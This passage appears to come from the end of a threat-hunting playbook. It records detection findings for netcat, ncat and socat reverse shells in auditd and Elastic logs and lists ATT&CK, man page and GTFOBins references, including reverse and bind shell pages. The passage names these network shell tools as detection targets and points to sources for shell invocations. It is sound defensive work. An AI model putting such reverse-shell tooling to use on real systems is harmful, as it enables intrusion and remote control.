- **KB-worthy (persist to NBI customer scope):** (1) `nc`/`ncat`/`netcat`/`socat` zero-baseline over 4h fleet-wide and 30d; (2) actor on the busy nodes = `root`, `user.name` largely null (the webshell hallmark is a non-root service account); (3) no `destination.ip` on the auditd stream — endpoint is in `process.args`; (4) `logs-system.auth-*` carries SSH `source.ip` for session origin; (5) the §17.5 arsenal LIKE-cluster confirms an interactive reverse shell. All observed live on 2026-08-17.

## 24. References

- MITRE ATT&CK — Command and Scripting Interpreter: Unix Shell (T1059.004): https://attack.mitre.org/techniques/T1059/004/
- MITRE ATT&CK — Protocol Tunneling (T1572): https://attack.mitre.org/techniques/T1572/
- MITRE ATT&CK — Application Layer Protocol: Web Protocols (T1071.001): https://attack.mitre.org/techniques/T1071/001/
- MITRE ATT&CK — Command and Control tactic (TA0011): https://attack.mitre.org/tactics/TA0011/
- man7.org — ncat(1) (Nmap netcat; relays and shells): https://man7.org/linux/man-pages/man1/ncat.1.html
- man7.org — mkfifo(1) (named pipes used for backpipes): https://man7.org/linux/man-pages/man1/mkfifo.1.html
- GTFOBins — nc (reverse/bind shell invocations): https://gtfobins.github.io/gtfobins/nc/
- GTFOBins — socat (reverse/bind shell invocations): https://gtfobins.github.io/gtfobins/socat/
- Elastic — Auditd Manager integration (fields and setup): https://docs.elastic.co/integrations/auditd_manager
